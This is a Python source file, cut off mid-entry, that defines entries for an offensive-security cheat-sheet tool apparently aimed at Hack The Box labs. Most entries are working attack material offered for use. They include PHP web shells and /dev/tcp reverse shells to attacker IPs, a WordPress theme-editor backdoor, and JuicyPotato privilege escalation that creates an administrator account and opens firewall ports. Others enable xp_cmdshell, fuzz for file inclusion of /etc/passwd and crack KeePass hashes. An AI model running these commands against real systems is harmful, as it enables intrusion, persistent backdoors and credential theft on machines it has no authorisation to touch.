fileTransfereLinux = create_new_cheat("File Transfere Linux - nc / ftp / lftp / scp")
fileTransfereLinux.category = "Linux"
fileTransfereLinux.sub_category = "File Transfere"
fileTransfereLinux.output = """[*] File Transfere Techniques With nc - Linux

nc -nlvp 4646 > file.f     # receiver
nc <Ip> 4646 < file.f      # sender

[*] File Transfere Techniques With FTP server

# curlftpfs - mount a ftp host as a local directory
# The program curlftpfs is a tool to mount remote ftp hosts as local directories. 
# It connects to the host FTP server and maps its directory structure to the path directory.

curlftpfs anonymous:senhalol@10.10.10.78 $(pwd) 

[*] Simple Ftp Transfere

# IMPORTANT NOTE: when download, use binary mode
ftp > binary
ftp > prompt off
ftp > mget *

[*] Login oneLiner with crdentials

lftp -u anonymous,'' 10.10.10.184

[*] Copy files via secure copy (scp)

# Upload file
scp /local/directory/fileName username@x.x.x.x:/remote/directory/fileName 

# Download file
scp username@x.x.x.x:/remote/directory/fileName /local/directory/fileName
"""

######################################
######################################

webShell = create_new_cheat("WebShell - php")
webShell.category = "Web"
webShell.sub_category = "RCE"
webShell.output = f"""[*] Web Shell em PHP

<?php
    echo "\\nURL Shell... url?cmd=<command>\\n\\n";
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

# Or...
<?php echo system($_GET['cmd']); exit; ?>

# Or...
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{ip}/443 0>&1'");?>
"""

######################################
######################################

fakeShell = create_new_cheat(
    "Fake Shell in bash for web shell with parameter and RCE - urlencoded"
)
fakeShell.category = "Web"
fakeShell.sub_category = "RCE"
fakeShell.output = """[*] Script in bash to simule shell via webshell RCE

#!/bin/bash

function ctrl_c() {
    echo -e "\n[!]Saindo...\n"
    exit 1
}
# Ctrl+C
trap ctrl_c INT

declare -r mainUrl="http://sec03.rentahacker.htb/shell.php"
declare -r paramName="hidden"

while true; do
    echo -n "[fakeShell ~] " && read -r command
    echo
    curl -s -X GET -G $mainUrl --data-urlencode "$paramName=$command"
    echo
done

"""

######################################
######################################

treeWorpress = create_new_cheat(
    "Wordpress - WP - Tree/structure of basic wordpress path and files"
)
treeWorpress.category = "Web"
treeWorpress.sub_category = "CMS"
treeWorpress.output = """[*] Wordpress basic structure path and files

sudo wget http://wordpress.org/latest.tar.gz
tar -xf latest.tar.gz
tree -L 3 --dirsfirst . -f -x

.
└── ./wordpress
    ├── ./wordpress/wp-admin
    │   ├── ./wordpress/wp-admin/css
    │   ├── ./wordpress/wp-admin/images
    │   ├── ./wordpress/wp-admin/includes
    │   ├── ./wordpress/wp-admin/js
    │   ├── ./wordpress/wp-admin/maint
    │   ├── ./wordpress/wp-admin/network
    │   ├── ./wordpress/wp-admin/user
    │   ├── ./wordpress/wp-admin/about.php
    │   ├── ./wordpress/wp-admin/admin-ajax.php
    │   ├── ./wordpress/wp-admin/admin-footer.php
    │   ├── ./wordpress/wp-admin/admin-functions.php
    │   ├── ./wordpress/wp-admin/admin-header.php
    │   ├── ./wordpress/wp-admin/admin.php
    │   ├── ./wordpress/wp-admin/admin-post.php
    │   ├── ./wordpress/wp-admin/async-upload.php
    │   ├── ./wordpress/wp-admin/authorize-application.php
    │   ├── ./wordpress/wp-admin/comment.php
    │   ├── ./wordpress/wp-admin/credits.php
    │   ├── ./wordpress/wp-admin/custom-background.php
    │   ├── ./wordpress/wp-admin/custom-header.php
    │   ├── ./wordpress/wp-admin/customize.php
    │   ├── ./wordpress/wp-admin/edit-comments.php
    │   ├── ./wordpress/wp-admin/edit-form-advanced.php
    │   ├── ./wordpress/wp-admin/edit-form-blocks.php
    │   ├── ./wordpress/wp-admin/edit-form-comment.php
    │   ├── ./wordpress/wp-admin/edit-link-form.php
    │   ├── ./wordpress/wp-admin/edit.php
    │   ├── ./wordpress/wp-admin/edit-tag-form.php
    │   ├── ./wordpress/wp-admin/edit-tags.php
    │   ├── ./wordpress/wp-admin/erase-personal-data.php
    │   ├── ./wordpress/wp-admin/export-personal-data.php
    │   ├── ./wordpress/wp-admin/export.php
    │   ├── ./wordpress/wp-admin/freedoms.php
    │   ├── ./wordpress/wp-admin/import.php
    │   ├── ./wordpress/wp-admin/index.php
    │   ├── ./wordpress/wp-admin/install-helper.php
    │   ├── ./wordpress/wp-admin/install.php
    │   ├── ./wordpress/wp-admin/link-add.php
    │   ├── ./wordpress/wp-admin/link-manager.php
    │   ├── ./wordpress/wp-admin/link-parse-opml.php
    │   ├── ./wordpress/wp-admin/link.php
    │   ├── ./wordpress/wp-admin/load-scripts.php
    │   ├── ./wordpress/wp-admin/load-styles.php
    │   ├── ./wordpress/wp-admin/media-new.php
    │   ├── ./wordpress/wp-admin/media.php
    │   ├── ./wordpress/wp-admin/media-upload.php
    │   ├── ./wordpress/wp-admin/menu-header.php
    │   ├── ./wordpress/wp-admin/menu.php
    │   ├── ./wordpress/wp-admin/moderation.php
    │   ├── ./wordpress/wp-admin/ms-admin.php
    │   ├── ./wordpress/wp-admin/ms-delete-site.php
    │   ├── ./wordpress/wp-admin/ms-edit.php
    │   ├── ./wordpress/wp-admin/ms-options.php
    │   ├── ./wordpress/wp-admin/ms-sites.php
    │   ├── ./wordpress/wp-admin/ms-themes.php
    │   ├── ./wordpress/wp-admin/ms-upgrade-network.php
    │   ├── ./wordpress/wp-admin/ms-users.php
    │   ├── ./wordpress/wp-admin/my-sites.php
    │   ├── ./wordpress/wp-admin/nav-menus.php
    │   ├── ./wordpress/wp-admin/network.php
    │   ├── ./wordpress/wp-admin/options-discussion.php
    │   ├── ./wordpress/wp-admin/options-general.php
    │   ├── ./wordpress/wp-admin/options-head.php
    │   ├── ./wordpress/wp-admin/options-media.php
    │   ├── ./wordpress/wp-admin/options-permalink.php
    │   ├── ./wordpress/wp-admin/options.php
    │   ├── ./wordpress/wp-admin/options-privacy.php
    │   ├── ./wordpress/wp-admin/options-reading.php
    │   ├── ./wordpress/wp-admin/options-writing.php
    │   ├── ./wordpress/wp-admin/plugin-editor.php
    │   ├── ./wordpress/wp-admin/plugin-install.php
    │   ├── ./wordpress/wp-admin/plugins.php
    │   ├── ./wordpress/wp-admin/post-new.php
    │   ├── ./wordpress/wp-admin/post.php
    │   ├── ./wordpress/wp-admin/press-this.php
    │   ├── ./wordpress/wp-admin/privacy.php
    │   ├── ./wordpress/wp-admin/privacy-policy-guide.php
    │   ├── ./wordpress/wp-admin/profile.php
    │   ├── ./wordpress/wp-admin/revision.php
    │   ├── ./wordpress/wp-admin/setup-config.php
    │   ├── ./wordpress/wp-admin/site-health-info.php
    │   ├── ./wordpress/wp-admin/site-health.php
    │   ├── ./wordpress/wp-admin/term.php
    │   ├── ./wordpress/wp-admin/theme-editor.php
    │   ├── ./wordpress/wp-admin/theme-install.php
    │   ├── ./wordpress/wp-admin/themes.php
    │   ├── ./wordpress/wp-admin/tools.php
    │   ├── ./wordpress/wp-admin/update-core.php
    │   ├── ./wordpress/wp-admin/update.php
    │   ├── ./wordpress/wp-admin/upgrade-functions.php
    │   ├── ./wordpress/wp-admin/upgrade.php
    │   ├── ./wordpress/wp-admin/upload.php
    │   ├── ./wordpress/wp-admin/user-edit.php
    │   ├── ./wordpress/wp-admin/user-new.php
    │   ├── ./wordpress/wp-admin/users.php
    │   ├── ./wordpress/wp-admin/widgets-form-blocks.php
    │   ├── ./wordpress/wp-admin/widgets-form.php
    │   └── ./wordpress/wp-admin/widgets.php
    ├── ./wordpress/wp-content
    │   ├── ./wordpress/wp-content/plugins
    │   ├── ./wordpress/wp-content/themes
    │   └── ./wordpress/wp-content/index.php
    ├── ./wordpress/wp-includes
    │   ├── ./wordpress/wp-includes/assets
    │   ├── ./wordpress/wp-includes/block-patterns
    │   ├── ./wordpress/wp-includes/blocks
    │   ├── ./wordpress/wp-includes/block-supports
    │   ├── ./wordpress/wp-includes/certificates
    │   ├── ./wordpress/wp-includes/css
    │   ├── ./wordpress/wp-includes/customize
    │   ├── ./wordpress/wp-includes/fonts
    │   ├── ./wordpress/wp-includes/ID3
    │   ├── ./wordpress/wp-includes/images
    │   ├── ./wordpress/wp-includes/IXR
    │   ├── ./wordpress/wp-includes/js
    │   ├── ./wordpress/wp-includes/PHPMailer
    │   ├── ./wordpress/wp-includes/pomo
    │   ├── ./wordpress/wp-includes/random_compat
    │   ├── ./wordpress/wp-includes/Requests
    │   ├── ./wordpress/wp-includes/rest-api
    │   ├── ./wordpress/wp-includes/SimplePie
    │   ├── ./wordpress/wp-includes/sitemaps
    │   ├── ./wordpress/wp-includes/sodium_compat
    │   ├── ./wordpress/wp-includes/Text
    │   ├── ./wordpress/wp-includes/theme-compat
    │   ├── ./wordpress/wp-includes/widgets
    │   ├── ./wordpress/wp-includes/admin-bar.php
    │   ├── ./wordpress/wp-includes/atomlib.php
    │   ├── ./wordpress/wp-includes/author-template.php
    │   ├── ./wordpress/wp-includes/block-editor.php
    │   ├── ./wordpress/wp-includes/block-patterns.php
    │   ├── ./wordpress/wp-includes/blocks.php
    │   ├── ./wordpress/wp-includes/block-template.php
    │   ├── ./wordpress/wp-includes/block-template-utils.php
    │   ├── ./wordpress/wp-includes/bookmark.php
    │   ├── ./wordpress/wp-includes/bookmark-template.php
    │   ├── ./wordpress/wp-includes/cache-compat.php
    │   ├── ./wordpress/wp-includes/cache.php
    │   ├── ./wordpress/wp-includes/canonical.php
    │   ├── ./wordpress/wp-includes/capabilities.php
    │   ├── ./wordpress/wp-includes/category.php
    │   ├── ./wordpress/wp-includes/category-template.php
    │   ├── ./wordpress/wp-includes/class-feed.php
    │   ├── ./wordpress/wp-includes/class-http.php
    │   ├── ./wordpress/wp-includes/class-IXR.php
    │   ├── ./wordpress/wp-includes/class-json.php
    │   ├── ./wordpress/wp-includes/class-oembed.php
    │   ├── ./wordpress/wp-includes/class-phpass.php
    │   ├── ./wordpress/wp-includes/class-phpmailer.php
    │   ├── ./wordpress/wp-includes/class-pop3.php
    │   ├── ./wordpress/wp-includes/class-requests.php
    │   ├── ./wordpress/wp-includes/class-simplepie.php
    │   ├── ./wordpress/wp-includes/class-smtp.php
    │   ├── ./wordpress/wp-includes/class-snoopy.php
    │   ├── ./wordpress/wp-includes/class-walker-category-dropdown.php
    │   ├── ./wordpress/wp-includes/class-walker-category.php
    │   ├── ./wordpress/wp-includes/class-walker-comment.php
    │   ├── ./wordpress/wp-includes/class-walker-nav-menu.php
    │   ├── ./wordpress/wp-includes/class-walker-page-dropdown.php
    │   ├── ./wordpress/wp-includes/class-walker-page.php
    │   ├── ./wordpress/wp-includes/class-wp-admin-bar.php
    │   ├── ./wordpress/wp-includes/class-wp-ajax-response.php
    │   ├── ./wordpress/wp-includes/class-wp-application-passwords.php
    │   ├── ./wordpress/wp-includes/class-wp-block-editor-context.php
    │   ├── ./wordpress/wp-includes/class-wp-block-list.php
    │   ├── ./wordpress/wp-includes/class-wp-block-parser.php
    │   ├── ./wordpress/wp-includes/class-wp-block-pattern-categories-registry.php
    │   ├── ./wordpress/wp-includes/class-wp-block-patterns-registry.php
    │   ├── ./wordpress/wp-includes/class-wp-block.php
    │   ├── ./wordpress/wp-includes/class-wp-block-styles-registry.php
    │   ├── ./wordpress/wp-includes/class-wp-block-supports.php
    │   ├── ./wordpress/wp-includes/class-wp-block-template.php
    │   ├── ./wordpress/wp-includes/class-wp-block-type.php
    │   ├── ./wordpress/wp-includes/class-wp-block-type-registry.php
    │   ├── ./wordpress/wp-includes/class-wp-comment.php
    │   ├── ./wordpress/wp-includes/class-wp-comment-query.php
    │   ├── ./wordpress/wp-includes/class-wp-customize-control.php
    │   ├── ./wordpress/wp-includes/class-wp-customize-manager.php
    │   ├── ./wordpress/wp-includes/class-wp-customize-nav-menus.php
    │   ├── ./wordpress/wp-includes/class-wp-customize-panel.php
    │   ├── ./wordpress/wp-includes/class-wp-customize-section.php
    │   ├── ./wordpress/wp-includes/class-wp-customize-setting.php
    │   ├── ./wordpress/wp-includes/class-wp-customize-widgets.php
    │   ├── ./wordpress/wp-includes/class-wp-date-query.php
    │   ├── ./wordpress/wp-includes/class.wp-dependencies.php
    │   ├── ./wordpress/wp-includes/class-wp-dependency.php
    │   ├── ./wordpress/wp-includes/class-wp-editor.php
    │   ├── ./wordpress/wp-includes/class-wp-embed.php
    │   ├── ./wordpress/wp-includes/class-wp-error.php
    │   ├── ./wordpress/wp-includes/class-wp-fatal-error-handler.php
    │   ├── ./wordpress/wp-includes/class-wp-feed-cache.php
    │   ├── ./wordpress/wp-includes/class-wp-feed-cache-transient.php
    │   ├── ./wordpress/wp-includes/class-wp-hook.php
    │   ├── ./wordpress/wp-includes/class-wp-http-cookie.php
    │   ├── ./wordpress/wp-includes/class-wp-http-curl.php
    │   ├── ./wordpress/wp-includes/class-wp-http-encoding.php
    │   ├── ./wordpress/wp-includes/class-wp-http-ixr-client.php
    │   ├── ./wordpress/wp-includes/class-wp-http-proxy.php
    │   ├── ./wordpress/wp-includes/class-wp-http-requests-hooks.php
    │   ├── ./wordpress/wp-includes/class-wp-http-requests-response.php
    │   ├── ./wordpress/wp-includes/class-wp-http-response.php
    │   ├── ./wordpress/wp-includes/class-wp-http-streams.php
    │   ├── ./wordpress/wp-includes/class-wp-image-editor-gd.php
    │   ├── ./wordpress/wp-includes/class-wp-image-editor-imagick.php
    │   ├── ./wordpress/wp-includes/class-wp-image-editor.php
    │   ├── ./wordpress/wp-includes/class-wp-list-util.php
    │   ├── ./wordpress/wp-includes/class-wp-locale.php
    │   ├── ./wordpress/wp-includes/class-wp-locale-switcher.php
    │   ├── ./wordpress/wp-includes/class-wp-matchesmapregex.php
    │   ├── ./wordpress/wp-includes/class-wp-metadata-lazyloader.php
    │   ├── ./wordpress/wp-includes/class-wp-meta-query.php
    │   ├── ./wordpress/wp-includes/class-wp-network.php
    │   ├── ./wordpress/wp-includes/class-wp-network-query.php
    │   ├── ./wordpress/wp-includes/class-wp-object-cache.php
    │   ├── ./wordpress/wp-includes/class-wp-oembed-controller.php
    │   ├── ./wordpress/wp-includes/class-wp-oembed.php
    │   ├── ./wordpress/wp-includes/class-wp-paused-extensions-storage.php
    │   ├── ./wordpress/wp-includes/class-wp.php
    │   ├── ./wordpress/wp-includes/class-wp-post.php
    │   ├── ./wordpress/wp-includes/class-wp-post-type.php
    │   ├── ./wordpress/wp-includes/class-wp-query.php
    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-cookie-service.php
    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-email-service.php
    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-key-service.php
    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode-link-service.php
    │   ├── ./wordpress/wp-includes/class-wp-recovery-mode.php
    │   ├── ./wordpress/wp-includes/class-wp-rewrite.php
    │   ├── ./wordpress/wp-includes/class-wp-role.php
    │   ├── ./wordpress/wp-includes/class-wp-roles.php
    │   ├── ./wordpress/wp-includes/class.wp-scripts.php
    │   ├── ./wordpress/wp-includes/class-wp-session-tokens.php
    │   ├── ./wordpress/wp-includes/class-wp-simplepie-file.php
    │   ├── ./wordpress/wp-includes/class-wp-simplepie-sanitize-kses.php
    │   ├── ./wordpress/wp-includes/class-wp-site.php
    │   ├── ./wordpress/wp-includes/class-wp-site-query.php
    │   ├── ./wordpress/wp-includes/class.wp-styles.php
    │   ├── ./wordpress/wp-includes/class-wp-taxonomy.php
    │   ├── ./wordpress/wp-includes/class-wp-tax-query.php
    │   ├── ./wordpress/wp-includes/class-wp-term.php
    │   ├── ./wordpress/wp-includes/class-wp-term-query.php
    │   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-inline.php
    │   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-table.php
    │   ├── ./wordpress/wp-includes/class-wp-theme-json.php
    │   ├── ./wordpress/wp-includes/class-wp-theme-json-resolver.php
    │   ├── ./wordpress/wp-includes/class-wp-theme.php
    │   ├── ./wordpress/wp-includes/class-wp-user-meta-session-tokens.php
    │   ├── ./wordpress/wp-includes/class-wp-user.php
    │   ├── ./wordpress/wp-includes/class-wp-user-query.php
    │   ├── ./wordpress/wp-includes/class-wp-user-request.php
    │   ├── ./wordpress/wp-includes/class-wp-walker.php
    │   ├── ./wordpress/wp-includes/class-wp-widget-factory.php
    │   ├── ./wordpress/wp-includes/class-wp-widget.php
    │   ├── ./wordpress/wp-includes/class-wp-xmlrpc-server.php
    │   ├── ./wordpress/wp-includes/comment.php
    │   ├── ./wordpress/wp-includes/comment-template.php
    │   ├── ./wordpress/wp-includes/compat.php
    │   ├── ./wordpress/wp-includes/cron.php
    │   ├── ./wordpress/wp-includes/date.php
    │   ├── ./wordpress/wp-includes/default-constants.php
    │   ├── ./wordpress/wp-includes/default-filters.php
    │   ├── ./wordpress/wp-includes/default-widgets.php
    │   ├── ./wordpress/wp-includes/deprecated.php
    │   ├── ./wordpress/wp-includes/embed.php
    │   ├── ./wordpress/wp-includes/embed-template.php
    │   ├── ./wordpress/wp-includes/error-protection.php
    │   ├── ./wordpress/wp-includes/feed-atom-comments.php
    │   ├── ./wordpress/wp-includes/feed-atom.php
    │   ├── ./wordpress/wp-includes/feed.php
    │   ├── ./wordpress/wp-includes/feed-rdf.php
    │   ├── ./wordpress/wp-includes/feed-rss2-comments.php
    │   ├── ./wordpress/wp-includes/feed-rss2.php
    │   ├── ./wordpress/wp-includes/feed-rss.php
    │   ├── ./wordpress/wp-includes/formatting.php
    │   ├── ./wordpress/wp-includes/functions.php
    │   ├── ./wordpress/wp-includes/functions.wp-scripts.php
    │   ├── ./wordpress/wp-includes/functions.wp-styles.php
    │   ├── ./wordpress/wp-includes/general-template.php
    │   ├── ./wordpress/wp-includes/http.php
    │   ├── ./wordpress/wp-includes/https-detection.php
    │   ├── ./wordpress/wp-includes/https-migration.php
    │   ├── ./wordpress/wp-includes/kses.php
    │   ├── ./wordpress/wp-includes/l10n.php
    │   ├── ./wordpress/wp-includes/link-template.php
    │   ├── ./wordpress/wp-includes/load.php
    │   ├── ./wordpress/wp-includes/locale.php
    │   ├── ./wordpress/wp-includes/media.php
    │   ├── ./wordpress/wp-includes/media-template.php
    │   ├── ./wordpress/wp-includes/meta.php
    │   ├── ./wordpress/wp-includes/ms-blogs.php
    │   ├── ./wordpress/wp-includes/ms-default-constants.php
    │   ├── ./wordpress/wp-includes/ms-default-filters.php
    │   ├── ./wordpress/wp-includes/ms-deprecated.php
    │   ├── ./wordpress/wp-includes/ms-files.php
    │   ├── ./wordpress/wp-includes/ms-functions.php
    │   ├── ./wordpress/wp-includes/ms-load.php
    │   ├── ./wordpress/wp-includes/ms-network.php
    │   ├── ./wordpress/wp-includes/ms-settings.php
    │   ├── ./wordpress/wp-includes/ms-site.php
    │   ├── ./wordpress/wp-includes/nav-menu.php
    │   ├── ./wordpress/wp-includes/nav-menu-template.php
    │   ├── ./wordpress/wp-includes/option.php
    │   ├── ./wordpress/wp-includes/pluggable-deprecated.php
    │   ├── ./wordpress/wp-includes/pluggable.php
    │   ├── ./wordpress/wp-includes/plugin.php
    │   ├── ./wordpress/wp-includes/post-formats.php
    │   ├── ./wordpress/wp-includes/post.php
    │   ├── ./wordpress/wp-includes/post-template.php
    │   ├── ./wordpress/wp-includes/post-thumbnail-template.php
    │   ├── ./wordpress/wp-includes/query.php
    │   ├── ./wordpress/wp-includes/registration-functions.php
    │   ├── ./wordpress/wp-includes/registration.php
    │   ├── ./wordpress/wp-includes/rest-api.php
    │   ├── ./wordpress/wp-includes/revision.php
    │   ├── ./wordpress/wp-includes/rewrite.php
    │   ├── ./wordpress/wp-includes/robots-template.php
    │   ├── ./wordpress/wp-includes/rss-functions.php
    │   ├── ./wordpress/wp-includes/rss.php
    │   ├── ./wordpress/wp-includes/script-loader.php
    │   ├── ./wordpress/wp-includes/session.php
    │   ├── ./wordpress/wp-includes/shortcodes.php
    │   ├── ./wordpress/wp-includes/sitemaps.php
    │   ├── ./wordpress/wp-includes/spl-autoload-compat.php
    │   ├── ./wordpress/wp-includes/taxonomy.php
    │   ├── ./wordpress/wp-includes/template-canvas.php
    │   ├── ./wordpress/wp-includes/template-loader.php
    │   ├── ./wordpress/wp-includes/template.php
    │   ├── ./wordpress/wp-includes/theme-i18n.json
    │   ├── ./wordpress/wp-includes/theme.json
    │   ├── ./wordpress/wp-includes/theme.php
    │   ├── ./wordpress/wp-includes/theme-templates.php
    │   ├── ./wordpress/wp-includes/update.php
    │   ├── ./wordpress/wp-includes/user.php
    │   ├── ./wordpress/wp-includes/vars.php
    │   ├── ./wordpress/wp-includes/version.php
    │   ├── ./wordpress/wp-includes/widgets.php
    │   ├── ./wordpress/wp-includes/wlwmanifest.xml
    │   ├── ./wordpress/wp-includes/wp-db.php
    │   └── ./wordpress/wp-includes/wp-diff.php
    ├── ./wordpress/index.php
    ├── ./wordpress/license.txt
    ├── ./wordpress/readme.html
    ├── ./wordpress/wp-activate.php
    ├── ./wordpress/wp-blog-header.php
    ├── ./wordpress/wp-comments-post.php
    ├── ./wordpress/wp-config-sample.php
    ├── ./wordpress/wp-cron.php
    ├── ./wordpress/wp-links-opml.php
    ├── ./wordpress/wp-load.php
    ├── ./wordpress/wp-login.php
    ├── ./wordpress/wp-mail.php
    ├── ./wordpress/wp-settings.php
    ├── ./wordpress/wp-signup.php
    ├── ./wordpress/wp-trackback.php
    └── ./wordpress/xmlrpc.php

36 directories, 320 files
"""

######################################
######################################

reverseShellWordpress = create_new_cheat("RCE - Wordpress (WP)")
reverseShellWordpress.category = "Web"
reverseShellWordpress.sub_category = "RCE"
reverseShellWordpress.output = """[*] When authenticated, we can change the WordPress 404.php to get RCE

# edit 404.php
http://10.10.10.37/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen&scrollto=0

# Put something like a RCE, or a reverse shell directely in between the 404.php code...
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.53/443 0>&1'");

# Access to 404.php
http://10.10.10.37/?p=404.php # Or http://10.10.10.37/?p=404.php&cmd=whoami if is a RCE
"""

######################################
######################################

ffuf = create_new_cheat("ffuf - Fuzz Faster U Fool")
ffuf.category = "Tools"
ffuf.sub_category = "BruteForce"
ffuf.output = """[*] Virtual Host Discovery (without DNS records)

# Start by figurinf out the response length of false positive
> curl -s -H "Host: thatsubdomaindontexist.site.com" http://site.com | wc -c

612

# Filter out response and FUZZ Hosts
> ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://site.com -H "Host: FUZZ.site.com" -t 500 -fs 612


# Fuzz PARAMETERS
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.11.135/image.php?FUZZ=../../../../../../../etc/passwd -H 'Cookie: PHPSESSID=or9gre2aitmqg3r2ndr9m3st3o' -t 10 -r -fs 0


# LFI with cookie example and unicode normalization vulnerability (‥ not ..):
ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://hackmedia.htb/display/?page=‥/‥/‥/‥/‥/‥/‥/‥/‥/‥/‥/FUZZ -b 'auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjIzMC9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.MKk27s1SX8G_iV74wwPA-iuRdCY0MtOb4RCgJ-aTDSQ9O39pj5UR4AsVsRynD9tFWdLKkg_9GkfHPWo5iUg46xalvSvo7SVRs8i67Ny_DDhxoiTSJpGNqUaCMefeNQItvfO_r7Jw6yh7VG3LGKfgzZC9HW1rUJfnaNLlXhNHQpqejpPvlNnx0_iMF-SEuuF1U-kjL7NMGtaDmMdBIEFK7QTChg5-KnxrLZoyTtYa92aTrpCm7BzD7Cr4Qpuv9ITJSdLgXRKo6xlSptmRAhfblWIU1Of0VuyGIrehaPcJJHj-yuXh1HnFwCwF2NPreGpj5XVwkqDuLRhk8tmYFnlCiA' -mc 200 -fw 1299
"""

######################################
######################################

chisel_portforwarding = create_new_cheat("chisel - port forwarding - TCP/UDP tunnel")
chisel_portforwarding.category = "Tools"
chisel_portforwarding.sub_category = "Forwarding"
chisel_portforwarding.output = """[*] Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH, for port forwarding.

# https://github.com/jpillora/chisel/releases
# Server - is my kali machine waiting for connection.
sudo chisel server -p 8008 --reverse   # port 8008 is the port of the chisel server, where chisel comunicate to other chisel

# Client - is the target machine we want to bypass firewall rules, forwarding it
# Next example, we connect to kali machine on port 8008 (where server chisel is), and we say the kali port 80 is 127.0.0.1:80 of the target machine.
./chisel client 10.10.14.43:8008 R:80:127.0.0.1:80     

# We can connect more then one ports at same time...
./chisel client 10.10.14.43:8008 R:80:127.0.0.1:80 R:1337:127.0.0.1:1337 R:3306:127.0.0.1:3306 R:8000:127.0.0.1:8000 R:52352:127.0.0.1:52352
"""

######################################
######################################

jwt_openssl = create_new_cheat(
    "JWT - openssl | get certificate via openssl | self-signed certificate"
)
jwt_openssl.category = "Web"
jwt_openssl.sub_category = "Cookie"
jwt_openssl.output = """[*] Generate privKey to manipulate JWT token

openssl genrsa -out privKey.key 2048

[*] Get certificate of a website

openssl s_client -connect 10.10.10.162:443

[*] Create and trust self-signed certificate (With private ca.key of the target machine)
# Save public cerifications of the website
openssl s_client -connect 10.10.10.131:443 | openssl x509 > ca.cer

# With ca.cer and ca.key, create the client key and certificate
openssl genrsa -out client.key 4096
openssl req -new -key client.key -out client.req
openssl x509 -req -in client.req -set_serial 123 -CA ca.cer -CAkey ca.key -days 365 -extensions client -outform PEM -out client.cer

# Create the certificate for browser
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
"""

######################################
######################################

juicyPotato = create_new_cheat(
    "JuicyPotato.exe - Windows - PrivEsc - SeImpersonatePrivilege"
)
juicyPotato.category = "Windows"
juicyPotato.sub_category = "PrivEsc via group"
juicyPotato.output = r"""[*] If in life you see SeImpersonatePrivilege, just use JuicyPotato!! =)

# Download JuicyPotato.exe and set a server http
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
sudo python3 -m http.server 80

# transfere to target machine
certutil -urlcache -f http://10.10.14.16/JuicyPotato.exe C:\\Temp\\JuicyPotato.exe

# Run! - Create a new user j4vali with password J4v4li123$!  
# (Close to always need a password like this!!)
# Run multiple times while showing OK!
cd C:\\Temp
.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net user j4vali J4v4li123$! /add"
.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net localgroup Administrators j4vali /add"

# Add my ip to allow all traffic UDP and TCP
.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c powerShell New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.16 -Direction inbound -Action Allow"

# Add permission to execute command from out of the local system (cmd)
.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"

# Open Ports (cmd)
.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow"
.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow"
.\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net share attacker_folder=C:\\Windows\\Temp /GRANT:Administrators,FULL"


# ------------------------------------------------------------------------
# Check if all correctly created (need to be \033[33;1m(Pwn3d!)\033[31;1m)
crackmapexec smb 10.10.10.93 -u 'j4vali' -p 'J4v4li123$!'

# On kali linux, we can now connect to the machine with ipexec.py or something like that:
psexec.py WORKGROUP/j4vali:@10.10.10.93 cmd.exe
"""

######################################
######################################

keepass = create_new_cheat("keepassxc - Password Manager KeePass Manager")
keepass.category = "Tools"
keepass.sub_category = "Password"
keepass.output = """[*] Extract passwords of KeePass (GUI)

sudo install keepassxc
keepassxc  # GUI application

# For try cracking master password, use keepass2john
keepass2john tim.kdbx > hash
john --wordlist=/usr/share/wordlist/rockyou.txt hash
"""

######################################
######################################

sqsh = create_new_cheat(
    "sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py"
)
sqsh.category = "Tools"
sqsh.sub_category = "Databases"
sqsh.output = """[*] sqsh - Interactive database shell

# Default Credentials are sa:sa OR sa without password (just press Enter)
sqsh -S 10.10.10.59 -U "sa"

# Commands:
# Try to execute comands on local machine
xp_cmdshell "whoami"
go

# If SQL Server blocked access to procedure...
sp_configure "show advanced options", 1
go
reconfigure
go
sp_configure "xp_cmdshell", 1
go
reconfigure
go

[*] mssqlclient.py - better then sqsh. Dont need "go"... all time xD

mssqlclient.py WORKGROUP/sa@10.10.10.59
xp_cmdshell "whoami"
sp_configure "show advanced options", 1
reconfigure
sp_configure "xp_cmdshell", 1
reconfigure
"""

######################################
######################################

x_forwarded_for = create_new_cheat("X-Forwarded-For - Proxy - Header - XFF")
x_forwarded_for.category = "Web"
x_forwarded_for.sub_category = "XFF"
x_forwarded_for.output = """[*] The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address

# You can simule easily your connection was from another IP with curl, modifying the header (or burp or something like that)
curl -s -X GET 'http://10.10.10.167/admin.php' -H 'X-Forwarded-For: 192.168.4.28'
"""

######################################
######################################

checkenv = create_new_cheat(
